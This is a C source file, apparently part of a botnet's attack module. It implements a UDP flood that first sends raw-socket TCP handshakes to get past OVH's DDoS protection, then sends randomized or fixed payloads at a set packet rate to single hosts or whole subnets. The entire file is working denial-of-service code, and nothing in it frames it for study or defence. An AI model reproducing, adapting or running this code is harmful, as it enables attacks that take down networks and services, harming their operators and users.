#define _GNU_SOURCE

#ifdef DEBUG
#endif

#include "../../../../utils/headers/checksum.h"

int tcp_handshake(uint16_t dport, int fd, unsigned int daddr, unsigned int saddr, unsigned int seq);

#include "../../attack.h"

void flood_udpbypass(struct flood *flood)
{
    struct sockaddr_in bind_addr = {0};

    int i = 0;
    int *fd = calloc(flood->num_of_targets, sizeof(int));

    // Randomize source port
    if (flood->settings->source_port == 0xffff)
        flood->settings->source_port = rand_next();

    for (i = 0; i < flood->num_of_targets; i++)
    {
        int sock = -1;
        struct sockaddr_in tcp_addr = {0};

        struct flood_target target = flood->targets[i];

        struct iphdr *ip_header;
        struct udphdr *udp_header;

        // Randomize destination port
        if (flood->settings->dest_port == 0xffff)
            target.sock_addr.sin_port = rand_next();

        target.sock_addr.sin_port = htons(flood->settings->dest_port);

        // Create datagram socket.
        if ((fd[i] = sys_socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
            return;

        // Bind a local server for the source port.
        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = flood->settings->source_port;
        bind_addr.sin_addr.s_addr = 0;
        sys_bind(fd[i], (struct sockaddr *)&bind_addr, sizeof(struct sockaddr_in));

        // Randomize destination address if the netmask is below 32 to add subnet support.
        if (target.netmask < 32)
            target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

        // TCP handshake to bypass OVH

        if ((sock = sys_socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
            return;

        i = 1;
        if (sys_setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
        {
            sys_close(sock);
            return;
        }

        tcp_addr.sin_family = AF_INET;
        tcp_addr.sin_port = flood->settings->tcp_dest_port;
        tcp_addr.sin_addr.s_addr = flood->targets[i].addr;

        int x;
        for (x = 0; x < flood->settings->repeat; x++)
        {
            if (tcp_handshake(flood->settings->dest_port, sock, tcp_addr.sin_addr.s_addr, _local_addr(), rand_next()) == 0)
            {
                sys_exit(0);
                return;
            }
            if (flood->settings->sleep != 0)
                sys_usleep(flood->settings->sleep * 1000);
        }

        // End TCP handshake

        // Connect to UDP socket
        sys_connect(fd[i], (struct sockaddr *)&target.sock_addr, sizeof(struct sockaddr_in));

        // The payload should be pre-initialized by the bot engine.
        if (flood->settings->payload == NULL)
        {
        }
    }

    struct pps_limiter pps_limit;
    pps_limit_init(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);

    // Start sending traffic.
    while (*flood->running)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            // Use a local copy of the target to avoid race conditions
            struct flood_target target = flood->targets[i];

            // Randomize destination address if the netmask is below 32 to add subnet support.
            if (target.netmask < 32)
                target.sock_addr.sin_addr.s_addr = htonl(ntohl(target.addr) + (((uint32_t)rand_next()) >> target.netmask));

            // Randomize payload when data randomization is turned on.
            if (flood->settings->random_data)
            {
                int actual_len = flood->settings->length;
                if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                    actual_len = rand_next_range(flood->settings->min_length, flood->settings->max_length);

                char *temp_payload = malloc(actual_len);
                if (temp_payload) {
                    rand_str(temp_payload, actual_len);
                    sys_sendto(fd[i], temp_payload, actual_len, MSG_NOSIGNAL, NULL, 0);
                    free(temp_payload);
                }
            }
            else
            {
                uint32_t actual_len = flood->settings->length;
                if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                    actual_len = rand_next_range(flood->settings->min_length, flood->settings->max_length);

                sys_sendto(fd[i], flood->settings->payload, actual_len > flood->settings->length ? flood->settings->length : actual_len, MSG_NOSIGNAL, NULL, 0);
            }
            
            pps_limit_wait(&pps_limit, flood->settings->min_pps, flood->settings->max_pps);
        }

        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);
    }
}
